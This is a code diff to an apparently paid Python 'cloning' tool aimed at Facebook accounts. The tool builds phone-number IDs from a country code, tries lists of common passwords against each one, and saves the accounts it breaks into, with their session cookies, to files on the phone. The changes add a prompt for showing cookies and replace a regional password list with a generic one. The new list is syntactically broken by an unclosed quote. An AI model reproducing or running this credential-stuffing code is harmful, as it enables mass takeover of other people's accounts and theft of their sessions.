@@ -167,22 +167,22 @@ BLACK="\033[1;30m"
 EXTRA ='\x1b[38;5;208m'
 #________________________________________#
 
-logo=(f"""{WHITE}
+logo=(f"""{YELLOW}
    oooo       .o.       ooooo        ooooo ooooo        
    `888      .888.      `888'        `888' `888'        
     888     .8"888.      888          888   888         
-    {GREEN}888    .8' `888.     888          888   888         
+    {WHITE}888    .8' `888.     888          888   888         
     888   .88ooo8888.    888          888   888         
-    {YELLOW}888  .8'     `888.   888       o  888   888       o 
+    {GREEN}888  .8'     `888.   888       o  888   888       o 
 .o. 88P o88o     o8888o o888ooooood8 o888o o888ooooood8 
 `Y888P                                      {GREEN}A {RED}L {WHITE}G
 \033[1;37m--------------------------------------------------
- [\033[1;32m*\033[1;37m] Author   : ITZJALIL0
- [\033[1;32m*\033[1;37m] Facebook : H. M. JALIL
- [\033[1;32m*\033[1;37m] Tool     : PAID
- [\033[1;32m*\033[1;37m] Version  : 1.0.1
+ [\033[1;32m~\033[1;37m] Author   : ITZJALIL0
+ [\033[1;32m~\033[1;37m] Facebook : H. M. JALIL
+ [\033[1;32m~\033[1;37m] Tool     : PAID
+ [\033[1;32m~\033[1;37m] Version  : 1.0.1
 \033[1;37m--------------------------------------------------
- [\033[1;32m*\033[1;37m]\033[1;33mYOUR ACCOUNTs ARE SAVE IN:\033[1;32m/sdcard/JALIIIL/JALIIIL-OK.txt\033[1;37m
+ [\033[1;32m~\033[1;37m]\033[1;33mYOUR ACCOUNTs ARE SAVE IN:\033[1;32m/sdcard/JALIIIL/JALIIIL-OK.txt\033[1;37m
 \033[1;37m--------------------------------------------------""")
 def linex():
 	print('\033[1;37m--------------------------------------------------')
@@ -294,6 +294,7 @@ def approval():
   except Exception as error:
     print(error)                        
 def menu():
+   approval()
 			#clear()
 		#	linex()
 			print(' [1] File cloning\n [2] Random cloning\n [3] gmail cloning \n [0] Exit menu')
@@ -337,6 +338,13 @@ def menu():
 					pcp.append('y')
 				else:
 					pcp.append('n')
+					print(' Do you went show Cookies (y/n): ')
+				linex()
+				cx=input(' Choose: ')
+				if cx in ['y','Y','yes','Yes','1']:
+					ck.append('y')
+				else:
+					ck.append('n')
 				with tred(max_workers=30) as crack_submit:
 					clear()
 					total_ids = str(len(fo))
@@ -377,7 +385,7 @@ def menu():
 def pak():
 		user=[]
 		clear()
-		print('\033[1;35m Code example: 0306,0315,0335,0345')
+		print('\033[1;35m Code example: 06,05,07')
 		code = input('\033[1;37m put code: ')
 		try:
 			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
@@ -388,7 +396,7 @@ def pak():
 		linex()
 		mthd = input(' Choose: ')
 		clear()
-		print(' [1] Number + khan password')
+		print(' [1] Number +  password')
 		linex()
 		pcs = input(' [?] Select: ')
 		for nmbr in range(limit):
@@ -399,12 +407,12 @@ def pak():
 			tl = str(len(user))
 			print(' Total ids : \033[1;32m'+tl+f' ')
 			print(f'\033[1;37m Choice code  :\033[1;32m '+code)
-			print(' \033[1;37mThe process is running in the background')
+			print(' \033[1;37mWait ;) ')
 			linex()
 			for psx in user:
 				ids = code+psx
 				if pcs in ['1','01']:
-					passlist = [psx,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
+					passlist = [psx,ids,'123456','123123','12345678','123456789','112233','mohamed','mohamed123','mohamed12345','qwerty','zxcvbn','zxcvbnm','wxcvbn','11223344','12341234','1122334455]
 				if mthd in ['1','01']:
 					JALIIIL.submit(JALIIIL4,ids,passlist)
 					
@@ -667,7 +675,7 @@ def api2(ids,names,passlist):
                         if 'session_key' in po:
                                         print('\r\r\033[1;32m [JALIIIL-OK] '+ids+' √ '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        print("\r\r\033[1;93m Cookie: "+coki)
+                                        print("Cookie:\r\r\033[1;93m "+coki)
                                         open('/sdcard/JALIIIL/JALIIIL-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                         open('/sdcard/JALIIIL/JALIIIL-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
